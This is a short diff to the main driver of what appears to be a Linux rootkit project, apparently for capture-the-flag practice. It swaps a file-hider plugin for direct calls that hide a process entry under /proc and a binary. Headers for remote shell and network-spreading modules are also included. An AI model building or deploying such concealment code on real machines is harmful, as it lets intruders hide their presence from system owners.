@@ -9,11 +9,11 @@
 
 #include "cli_shell_access//cli_shell_access.h"
 #include "process_access/process_access.h"
+#include "file_hiding_access/file_hiding_access.h"
 
 #include "features/network_crawler/network_crawler.h"
 #include "features/network_exploder/network_exploder.h"
 #include "features/remote_cli_shell_controller/remote_cli_shell_controller.h"
-#include "features/file_hider/file_hider.h"
 
 void execute() {
     linux_rootkit rootkit;
@@ -29,8 +29,11 @@ void execute() {
 //    rootkit.run_plugin(remote_cli_id);
 
 
-    id_value id = rootkit.load_plugin(std::make_unique<file_hider>());
-    rootkit.run_plugin(id, false);
+    hide_absolute_path("/proc/2906");
+    hide_absolute_path("/home/idan/ctf/a.out");
+
+    reports_test();
+
 
 //    while (true) {
 //    }
